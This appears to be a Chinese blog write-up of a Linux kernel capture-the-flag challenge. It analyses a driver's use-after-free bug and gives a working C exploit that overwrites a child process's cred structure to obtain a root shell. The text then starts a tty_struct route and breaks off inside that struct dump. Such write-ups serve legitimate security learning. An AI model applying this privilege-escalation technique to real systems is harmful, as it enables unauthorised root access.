<!doctype html>

<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224343188.png" alt="image-20220312224343188"></p>
<p>注意这里的<code>babydev</code>是一个全局变量，首先会释放掉<code>device_buf</code>处的内存，然后重新分配，参数使用用户参进来的大小。</p>
<h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p>就是把信息拷贝给用户态指针</p>
<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224502214.png" alt="image-20220312224502214"></p>
<h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>也很常规：</p>
<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224555808.png" alt="image-20220312224555808"></p>
<h4 id="close"><a href="#close" class="headerlink" title="close"></a>close</h4><p>对应的是<code>release</code>函数：</p>
<p>会释放<code>device_buf</code>处的内容</p>
<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224628497.png" alt="image-20220312224628497"></p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>全局变量的访问不加锁，即是漏洞。可以<code>double free</code>和<code>use after free</code>。</p>
<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><h4 id="UAF-cred结构体利用"><a href="#UAF-cred结构体利用" class="headerlink" title="UAF cred结构体利用"></a>UAF cred结构体利用</h4><p>该方法只在低版本的内核有效，高版本的特殊结构体的分配区间与普通映射区隔离开，所以子进程永远也无法分配到当前被释放的那个堆块。</p>
<p>本版本的内核还可以使用这种方法，因此，利用思路为：</p>
<ul>
<li>打开两次<code>baabydev</code></li>
<li>释放第一次</li>
<li>调用<code>fork</code>系统调用，得到子进程</li>
<li>通过第二次打开的句柄写，将其前<code>32</code>个字节刷为<code>0</code></li>
<li>子进程调用<code>system(&quot;/bin/sh&quot;)</code>即可获得<code>root</code>的<code>shell</code></li>
</ul>
<p>结构体为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset    |  size */</span>  type = struct cred &#123;</span><br><span class="line"><span class="comment">/*    0      |     4 */</span>    <span class="keyword">atomic_t</span> usage;</span><br><span class="line"><span class="comment">/*    4      |     4 */</span>    <span class="keyword">kuid_t</span> uid;</span><br><span class="line"><span class="comment">/*    8      |     4 */</span>    <span class="keyword">kgid_t</span> gid;</span><br><span class="line"><span class="comment">/*   12      |     4 */</span>    <span class="keyword">kuid_t</span> suid;</span><br><span class="line"><span class="comment">/*   16      |     4 */</span>    <span class="keyword">kgid_t</span> sgid;</span><br><span class="line"><span class="comment">/*   20      |     4 */</span>    <span class="keyword">kuid_t</span> euid;</span><br><span class="line"><span class="comment">/*   24      |     4 */</span>    <span class="keyword">kgid_t</span> egid;</span><br><span class="line"><span class="comment">/*   28      |     4 */</span>    <span class="keyword">kuid_t</span> fsuid;</span><br><span class="line"><span class="comment">/*   32      |     4 */</span>    <span class="keyword">kgid_t</span> fsgid;</span><br><span class="line"><span class="comment">/*   36      |     4 */</span>    <span class="keyword">unsigned</span> <span class="keyword">int</span> securebits;</span><br><span class="line"><span class="comment">/*   40      |     8 */</span>    <span class="keyword">kernel_cap_t</span> cap_inheritable;</span><br><span class="line"><span class="comment">/*   48      |     8 */</span>    <span class="keyword">kernel_cap_t</span> cap_permitted;</span><br><span class="line"><span class="comment">/*   56      |     8 */</span>    <span class="keyword">kernel_cap_t</span> cap_effective;</span><br><span class="line"><span class="comment">/*   64      |     8 */</span>    <span class="keyword">kernel_cap_t</span> cap_bset;</span><br><span class="line"><span class="comment">/*   72      |     8 */</span>    <span class="keyword">kernel_cap_t</span> cap_ambient;</span><br><span class="line"><span class="comment">/*   80      |     1 */</span>    <span class="keyword">unsigned</span> <span class="keyword">char</span> jit_keyring;</span><br><span class="line"><span class="comment">/* XXX  7-byte hole  */</span></span><br><span class="line"><span class="comment">/*   88      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">session_keyring</span>;</span></span><br><span class="line"><span class="comment">/*   96      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">process_keyring</span>;</span></span><br><span class="line"><span class="comment">/*  104      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">thread_keyring</span>;</span></span><br><span class="line"><span class="comment">/*  112      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">request_key_auth</span>;</span></span><br><span class="line"><span class="comment">/*  120      |     8 */</span>    <span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/*  128      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="comment">/*  136      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line"><span class="comment">/*  144      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line"><span class="comment">/*  152      |    16 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  152      |     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  160      |     8 */</span>        <span class="keyword">void</span> (*func)(struct callback_head *);</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                           &#125; rcu;</span><br><span class="line"></span><br><span class="line">                           <span class="comment">/* total size (bytes):  168 */</span></span><br><span class="line">                         &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312232031701.png" alt="image-20220312232031701"></p>
<p><code>exp</code>为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_alloc</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x10001</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UAF 使用cred提权</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exp1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(DEV_NAME, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(DEV_NAME, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        error(<span class="string">&quot;open error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    baby_alloc(fd1, <span class="number">0xa8</span>); <span class="comment">// sizeof(cred) == 0xa8</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">pid_t</span> child = fork();</span><br><span class="line">    <span class="keyword">if</span> (child &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        error(<span class="string">&quot;fork error!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child</span></span><br><span class="line">        <span class="keyword">char</span> payload[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, &amp;payload, <span class="number">32</span>);</span><br><span class="line">        get_shell();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="UAF-tty-operations结构体利用"><a href="#UAF-tty-operations结构体利用" class="headerlink" title="UAF tty_operations结构体利用"></a>UAF tty_operations结构体利用</h4><p>在<code>open(&quot;/dev/ptmx&quot;)</code>的时候，会分配到一个结构体<code>tty_struct</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset    |  size */</span>  type = struct tty_struct &#123;</span><br><span class="line"><span class="comment">/*    0      |     4 */</span>    <span class="keyword">int</span> magic;</span><br><span class="line"><span class="comment">/*    4      |     4 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> &#123;</span></span><br><span class="line"><span class="comment">/*    4      |     4 */</span>        <span class="keyword">atomic_t</span> refcount;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):    4 */</span></span><br><span class="line">                           &#125; kref;</span><br><span class="line"><span class="comment">/*    8      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"><span class="comment">/*   16      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line"><span class="comment">/*   24      |     8 */</span>    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="comment">/*   32      |     4 */</span>    <span class="keyword">int</span> index;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole  */</span></span><br><span class="line"><span class="comment">/*   40      |    48 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> &#123;</span></span><br><span class="line"><span class="comment">/*   40      |     8 */</span>        <span class="keyword">long</span> count;</span><br><span class="line"><span class="comment">/*   48      |     4 */</span>        <span class="keyword">raw_spinlock_t</span> wait_lock;</span><br><span class="line"><span class="comment">/*   52      |     4 */</span>        <span class="keyword">unsigned</span> <span class="keyword">int</span> wait_readers;</span><br><span class="line"><span class="comment">/*   56      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*   56      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*   64      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; read_wait;</span><br><span class="line"><span class="comment">/*   72      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*   72      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*   80      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; write_wait;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   48 */</span></span><br><span class="line">                           &#125; ldisc_sem;</span><br><span class="line"><span class="comment">/*   88      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"><span class="comment">/*   96      |    40 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> &#123;</span></span><br><span class="line"><span class="comment">/*   96      |     4 */</span>        <span class="keyword">atomic_t</span> count;</span><br><span class="line"><span class="comment">/*  100      |     4 */</span>        <span class="keyword">spinlock_t</span> wait_lock;</span><br><span class="line"><span class="comment">/*  104      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  104      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  112      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; wait_list;</span><br><span class="line"><span class="comment">/*  120      |     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="comment">/*  128      |     4 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">optimistic_spin_queue</span> &#123;</span></span><br><span class="line"><span class="comment">/*  128      |     4 */</span>            <span class="keyword">atomic_t</span> tail;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):    4 */</span></span><br><span class="line">                               &#125; osq;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   40 */</span></span><br><span class="line">                           &#125; atomic_write_lock;</span><br><span class="line"><span class="comment">/*  136      |    40 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> &#123;</span></span><br><span class="line"><span class="comment">/*  136      |     4 */</span>        <span class="keyword">atomic_t</span> count;</span><br><span class="line"><span class="comment">/*  140      |     4 */</span>        <span class="keyword">spinlock_t</span> wait_lock;</span><br><span class="line"><span class="comment">/*  144      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  144      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  152      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; wait_list;</span><br><span class="line"><span class="comment">/*  160      |     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="comment">/*  168      |     4 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">optimistic_spin_queue</span> &#123;</span></span><br><span class="line"><span class="comment">/*  168      |     4 */</span>            <span class="keyword">atomic_t</span> tail;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):    4 */</span></span><br><span class="line">                               &#125; osq;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   40 */</span></span><br><span class="line">                           &#125; legacy_mutex;</span><br><span class="line"><span class="comment">/*  176      |    40 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> &#123;</span></span><br><span class="line"><span class="comment">/*  176      |     4 */</span>        <span class="keyword">atomic_t</span> count;</span><br><span class="line"><span class="comment">/*  180      |     4 */</span>        <span class="keyword">spinlock_t</span> wait_lock;</span><br><span class="line"><span class="comment">/*  184      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  184      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  192      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; wait_list;</span><br><span class="line"><span class="comment">/*  200      |     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="comment">/*  208      |     4 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">optimistic_spin_queue</span> &#123;</span></span><br><span class="line"><span class="comment">/*  208      |     4 */</span>            <span class="keyword">atomic_t</span> tail;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):    4 */</span></span><br><span class="line">                               &#125; osq;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   40 */</span></span><br><span class="line">                           &#125; throttle_mutex;</span><br><span class="line"><span class="comment">/*  216      |    40 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> &#123;</span></span><br><span class="line"><span class="comment">/*  216      |     8 */</span>        <span class="keyword">long</span> count;</span><br><span class="line"><span class="comment">/*  224      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  224      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  232      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; wait_list;</span><br><span class="line"><span class="comment">/*  240      |     4 */</span>        <span class="keyword">raw_spinlock_t</span> wait_lock;</span><br><span class="line"><span class="comment">/*  244      |     4 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">optimistic_spin_queue</span> &#123;</span></span><br><span class="line"><span class="comment">/*  244      |     4 */</span>            <span class="keyword">atomic_t</span> tail;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):    4 */</span></span><br><span class="line">                               &#125; osq;</span><br><span class="line"><span class="comment">/*  248      |     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   40 */</span></span><br><span class="line">                           &#125; termios_rwsem;</span><br><span class="line"><span class="comment">/*  256      |    40 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> &#123;</span></span><br><span class="line"><span class="comment">/*  256      |     4 */</span>        <span class="keyword">atomic_t</span> count;</span><br><span class="line"><span class="comment">/*  260      |     4 */</span>        <span class="keyword">spinlock_t</span> wait_lock;</span><br><span class="line"><span class="comment">/*  264      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  264      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  272      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; wait_list;</span><br><span class="line"><span class="comment">/*  280      |     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="comment">/*  288      |     4 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">optimistic_spin_queue</span> &#123;</span></span><br><span class="line"><span class="comment">/*  288      |     4 */</span>            <span class="keyword">atomic_t</span> tail;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):    4 */</span></span><br><span class="line">                               &#125; osq;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   40 */</span></span><br><span class="line">                           &#125; winsize_mutex;</span><br><span class="line"><span class="comment">/*  296      |     4 */</span>    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line"><span class="comment">/*  300      |     4 */</span>    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line"><span class="comment">/*  304      |    44 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> &#123;</span></span><br><span class="line"><span class="comment">/*  304      |     4 */</span>        <span class="keyword">tcflag_t</span> c_iflag;</span><br><span class="line"><span class="comment">/*  308      |     4 */</span>        <span class="keyword">tcflag_t</span> c_oflag;</span><br><span class="line"><span class="comment">/*  312      |     4 */</span>        <span class="keyword">tcflag_t</span> c_cflag;</span><br><span class="line"><span class="comment">/*  316      |     4 */</span>        <span class="keyword">tcflag_t</span> c_lflag;</span><br><span class="line"><span class="comment">/*  320      |     1 */</span>        <span class="keyword">cc_t</span> c_line;</span><br><span class="line"><span class="comment">/*  321      |    19 */</span>        <span class="keyword">cc_t</span> c_cc[<span class="number">19</span>];</span><br><span class="line"><span class="comment">/*  340      |     4 */</span>        <span class="keyword">speed_t</span> c_ispeed;</span><br><span class="line"><span class="comment">/*  344      |     4 */</span>        <span class="keyword">speed_t</span> c_ospeed;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   44 */</span></span><br><span class="line">                           &#125; termios;</span><br><span class="line"><span class="comment">/*  348      |    44 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> &#123;</span></span><br><span class="line"><span class="comment">/*  348      |     4 */</span>        <span class="keyword">tcflag_t</span> c_iflag;</span><br><span class="line"><span class="comment">/*  352      |     4 */</span>        <span class="keyword">tcflag_t</span> c_oflag;</span><br><span class="line"><span class="comment">/*  356      |     4 */</span>        <span class="keyword">tcflag_t</span> c_cflag;</span><br><span class="line"><span class="comment">/*  360      |     4 */</span>        <span class="keyword">tcflag_t</span> c_lflag;</span><br><span class="line"><span class="comment">/*  364      |     1 */</span>        <span class="keyword">cc_t</span> c_line;</span><br><span class="line"><span class="comment">/*  365      |    19 */</span>        <span class="keyword">cc_t</span> c_cc[<span class="number">19</span>];</span><br><span class="line"><span class="comment">/*  384      |     4 */</span>        <span class="keyword">speed_t</span> c_ispeed;</span><br><span class="line"><span class="comment">/*  388      |     4 */</span>        <span class="keyword">speed_t</span> c_ospeed;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   44 */</span></span><br><span class="line">                           &#125; termios_locked;</span><br><span class="line"><span class="comment">/*  392      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span></span><br><span class="line"><span class="comment">/*  400      |    64 */</span>    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line"><span class="comment">/*  464      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line"><span class="comment">/*  472      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line"><span class="comment">/*  480      |     8 */</span>    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="comment">/*  488      |     4 */</span>    <span class="keyword">int</span> count;</span><br><span class="line"><span class="comment">/*  492      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> &#123;</span></span><br><span class="line"><span class="comment">/*  492      |     2 */</span>        <span class="keyword">unsigned</span> <span class="keyword">short</span> ws_row;</span><br><span class="line"><span class="comment">/*  494      |     2 */</span>        <span class="keyword">unsigned</span> <span class="keyword">short</span> ws_col;</span><br><span class="line"><span class="comment">/*  496      |     2 */</span>        <span class="keyword">unsigned</span> <span class="keyword">short</span> ws_xpixel;</span><br><span class="line"><span class="comment">/*  498      |     2 */</span>        <span class="keyword">unsigned</span> <span class="keyword">short</span> ws_ypixel;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):    8 */</span></span><br><span class="line">                           &#125; 